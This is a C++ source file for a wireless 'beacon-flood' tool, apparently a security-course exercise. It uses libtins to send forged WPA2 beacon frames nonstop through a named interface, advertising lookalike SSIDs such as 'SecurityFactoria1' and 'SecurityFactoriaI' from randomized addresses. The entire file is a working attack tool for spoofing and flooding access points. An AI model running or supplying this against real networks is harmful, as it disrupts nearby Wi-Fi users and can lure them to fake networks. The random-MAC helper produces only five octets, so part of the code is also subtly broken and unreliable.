#include <iostream>
#include <unistd.h>
#include <tins/tins.h>
#include <list>
#include <ctime>

using namespace std;

void usage(){
	cout << "syntax: beacon-flood <interface>" << endl;
	cout << "example: beacon-flood wlan0" << endl;
	exit(0);
}

string rand_mac(){
	string result = "";
	int nRandom;
	for(int i=0;i<5;i++){
		nRandom = rand()%10;
		result += to_string(nRandom);
		nRandom = rand()%10;
		result += to_string(nRandom);
		if(i!=4) result += ":";
			
	}
	return result;
}

int main(int argc, char *argv[]) {
	if(argc != 2) usage();
	// -- Base Setting
	list<string> ssidList{
		"SecurityFactoria1",
		"SecurityFactorial",
		"SecurityFactoriaI",
	};
	list<string>::iterator it = ssidList.begin();

	Tins::PacketSender sender;
	Tins::NetworkInterface iface(argv[1]);
	srand((unsigned int)time(0));
	// -- Packet Information
	while(1){
		Tins::Dot11Beacon beacon;
		beacon.addr1("ff:ff:ff:ff:ff:ff");
		beacon.addr2(rand_mac());
		beacon.addr3(beacon.addr2());
		beacon.ssid(*it);
		beacon.ds_parameter_set(8);
		beacon.supported_rates({1.0f, 5.5f, 11.0f});
		beacon.rsn_information(Tins::RSNInformation::wpa2_psk());

		Tins::RadioTap radio_tap;
		radio_tap.inner_pdu(beacon);

		sender.send(radio_tap,iface);
		if (++it == ssidList.end())
			it = ssidList.begin();
		usleep(1000);
	}

	return 0;
}
